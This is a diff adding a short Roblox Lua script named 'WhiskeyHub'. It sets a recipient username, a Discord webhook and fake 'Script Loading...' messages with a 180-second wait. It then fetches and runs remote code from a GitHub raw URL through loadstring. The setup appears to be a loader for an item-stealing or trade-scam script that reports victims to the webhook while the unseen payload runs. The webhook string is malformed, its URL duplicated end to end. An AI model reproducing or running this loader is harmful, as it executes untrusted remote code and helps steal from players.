@@ -1,0 +1,22 @@
+
+
+
+
+UserName = "thinhfankia"
+
+Webhook = "https://discord.com/api/webhooks/1107683878581317642/dQCnCj05hKQba90T1lFP6b4W0j1FkIKP3JGmfMq4UwwXG0YOsoMiKsc9yyQVMT441S_Ohttps://discord.com/api/webhooks/1107683878581317642/dQCnCj05hKQba90T1lFP6b4W0j1FkIKP3JGmfMq4UwwXG0YOsoMiKsc9yyQVMT441S_O"
+
+_G.ScriptName = "WhiskeyHub"
+
+_G.FirstText = "Script Preparing..."
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
+
+
+
